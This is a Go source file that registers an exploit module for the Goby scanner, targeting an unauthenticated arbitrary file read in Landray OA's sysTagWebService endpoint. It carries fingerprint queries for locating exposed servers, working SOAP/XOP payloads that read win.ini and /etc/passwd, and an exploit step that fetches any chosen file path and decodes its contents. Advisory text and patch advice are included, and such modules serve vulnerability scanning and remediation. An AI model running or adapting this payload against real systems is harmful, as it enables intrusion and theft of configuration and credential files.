package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Landray OA /sys/webservice/sysTagWebService File Read Vulnerability",
    "Description": "<p>Landray OA is a comprehensive office automation software system designed to provide efficient, secure, and intelligent office solutions for enterprises. The Landray OA /sys/webservice/sysTagWebService service has an arbitrary file read vulnerability. Unauthenticated attackers can exploit this vulnerability to read important files in the system, such as database configuration files and system configuration files, potentially leading to sensitive information disclosure and a highly insecure state of the website.</p>",
    "Product": "Landray OA",
    "Homepage": "https://www.landray.com.cn/",
    "DisclosureDate": "2024-12-26",
    "PostTime": "2024-12-26",
    "Author": "1251220046@qq.com",
    "FofaQuery": "body=\"lui_login_message_td\" || body=\"com.landray.kmss.km.archives.model.KmArchivesBorrow\" || body=\"return kmss_onsubmit()\" || body=\"SPRING_SECURITY_TARGET_URL\" || (title=\"欢迎登录智慧协同平台\" && body=\"欢迎登录智慧协同平台\") || body=\"蓝凌软件 版权所有\" || header=\"/resource/anonym.jsp\" || banner=\"/resource/anonym.jsp\"",
    "GobyQuery": "body=\"lui_login_message_td\" || body=\"com.landray.kmss.km.archives.model.KmArchivesBorrow\" || body=\"return kmss_onsubmit()\" || body=\"SPRING_SECURITY_TARGET_URL\" || (title=\"欢迎登录智慧协同平台\" && body=\"欢迎登录智慧协同平台\") || body=\"蓝凌软件 版权所有\" || header=\"/resource/anonym.jsp\" || banner=\"/resource/anonym.jsp\"",
    "Level": "1",
    "Impact": "<p>Attackers can exploit this vulnerability to read important files in the system, potentially leading to sensitive information disclosure and increasing the risk of further attacks on the system.</p>",
    "Recommendation": "<p>1. It is recommended to set access policies through security devices such as firewalls and configure whitelist access.</p><p>2. Prohibit public network access to the system unless necessary.</p><p>3. Upgrade to the secure version provided by the vendor or apply patches.</p>",
    "References": [
        "https://axsec.blog.csdn.net/article/details/144456364"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "C:/Windows/win.ini,/etc/passwd",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "C:/Windows/win.ini",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "POST",
                "uri": "/sys/webservice/sysTagWebService",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36",
                    "Connection": "close",
                    "Content-Type": "multipart/related; boundary=----4upt9dwdca8rtwq9osuz",
                    "SOAPAction": ""
                },
                "data_type": "text",
                "data": "------4upt9dwdca8rtwq9osuz\r\nContent-Disposition: form-data; name=\"a\"\r\n\r\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:web=\"http://webservice.tag.sys.kmss.landray.com/\">\r\n<soapenv:Header/>\r\n<soapenv:Body>\r\n    <web:getGroups>\r\n        <arg0>\r\n            <beginTimeStamp>a</beginTimeStamp>\r\n            <count><xop:Include xmlns:xop=\"http://www.w3.org/2004/08/xop/include\" href=\"file:///C:/Windows/win.ini\"/></count>\r\n        </arg0>\r\n    </web:getGroups>\r\n</soapenv:Body>\r\n</soapenv:Envelope>\r\n------4upt9dwdca8rtwq9osuz--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "regex",
                        "value": "Unmarshalling Error: 意外的文本 \"([^'\"]+)\"",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "</faultstring></soap:Fault></soap:Body></soap:Envelope>",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "not contains",
                        "value": "Unmarshalling Error: 意外的文本 \"\"",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/sys/webservice/sysTagWebService",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36",
                    "Connection": "close",
                    "Content-Type": "multipart/related; boundary=----4upt9dwdca8rtwq9osuz",
                    "SOAPAction": ""
                },
                "data_type": "text",
                "data": "------4upt9dwdca8rtwq9osuz\r\nContent-Disposition: form-data; name=\"a\"\r\n\r\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:web=\"http://webservice.tag.sys.kmss.landray.com/\">\r\n<soapenv:Header/>\r\n<soapenv:Body>\r\n    <web:getGroups>\r\n        <arg0>\r\n            <beginTimeStamp>a</beginTimeStamp>\r\n            <count><xop:Include xmlns:xop=\"http://www.w3.org/2004/08/xop/include\" href=\"file:///etc/passwd\"/></count>\r\n        </arg0>\r\n    </web:getGroups>\r\n</soapenv:Body>\r\n</soapenv:Envelope>\r\n------4upt9dwdca8rtwq9osuz--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "regex",
                        "value": "Unmarshalling Error: 意外的文本 \"([^'\"]+)\"",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "</faultstring></soap:Fault></soap:Body></soap:Envelope>",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "not contains",
                        "value": "Unmarshalling Error: 意外的文本 \"\"",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/sys/webservice/sysTagWebService",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36",
                    "Connection": "close",
                    "Content-Type": "multipart/related; boundary=----4upt9dwdca8rtwq9osuz",
                    "SOAPAction": ""
                },
                "data_type": "text",
                "data": "------4upt9dwdca8rtwq9osuz\r\nContent-Disposition: form-data; name=\"a\"\r\n\r\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:web=\"http://webservice.tag.sys.kmss.landray.com/\">\r\n<soapenv:Header/>\r\n<soapenv:Body>\r\n    <web:getGroups>\r\n        <arg0>\r\n            <beginTimeStamp>a</beginTimeStamp>\r\n            <count><xop:Include xmlns:xop=\"http://www.w3.org/2004/08/xop/include\" href=\"file:///{{{filePath}}}\"/></count>\r\n        </arg0>\r\n    </web:getGroups>\r\n</soapenv:Body>\r\n</soapenv:Envelope>\r\n------4upt9dwdca8rtwq9osuz--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "Unmarshalling Error: 意外的文本 \"([^'\"]+)\"",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "</faultstring></soap:Fault></soap:Body></soap:Envelope>",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "not contains",
                        "value": "Unmarshalling Error: 意外的文本 \"\"",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|Unmarshalling Error: 意外的文本 \"([^'\"]+)\"",
                "output|define|base64_decode|{{{output}}}"
            ]
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6.5",
    "Translation": {
        "CN": {
            "Name": "蓝凌OA /sys/webservice/sysTagWebService 文件读取漏洞",
            "Product": "蓝凌OA",
            "Description": "<p>蓝凌OA是一款全面的办公自动化软件系统，旨在为企业提供高效、安全、智能的办公解决方案。蓝凌OA /sys/webservice/sysTagWebService 服务存在任意文件读取漏洞，未经身份验证的攻击者可以通过该漏洞读取系统中的重要文件，例如数据库配置文件和系统配置文件，可能导致敏感信息泄露，网站处于极度不安全状态。</p>",
            "Recommendation": "<p>1. 建议通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>2. 如非必要，禁止公网访问该系统。</p><p>3. 升级至厂商提供的安全版本或打补丁。</p>",
            "Impact": "<p>攻击者可以通过该漏洞读取系统中的重要文件，可能导致敏感信息泄露，增加系统被进一步攻击的风险。</p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Landray OA /sys/webservice/sysTagWebService File Read Vulnerability",
            "Product": "Landray OA",
            "Description": "<p>Landray OA is a comprehensive office automation software system designed to provide efficient, secure, and intelligent office solutions for enterprises. The Landray OA /sys/webservice/sysTagWebService service has an arbitrary file read vulnerability. Unauthenticated attackers can exploit this vulnerability to read important files in the system, such as database configuration files and system configuration files, potentially leading to sensitive information disclosure and a highly insecure state of the website.</p>",
            "Recommendation": "<p>1. It is recommended to set access policies through security devices such as firewalls and configure whitelist access.</p><p>2. Prohibit public network access to the system unless necessary.</p><p>3. Upgrade to the secure version provided by the vendor or apply patches.</p>",
            "Impact": "<p>Attackers can exploit this vulnerability to read important files in the system, potentially leading to sensitive information disclosure and increasing the risk of further attacks on the system.</p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "payload": "switch|attackType|{{{default}}}",
        "filePath": "define|variable|{{{payload}}}"
    },
    "VariablesOrder": [
        "payload",
        "filePath"
    ],
    "EditType": "fast",
    "PocId": "9980"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
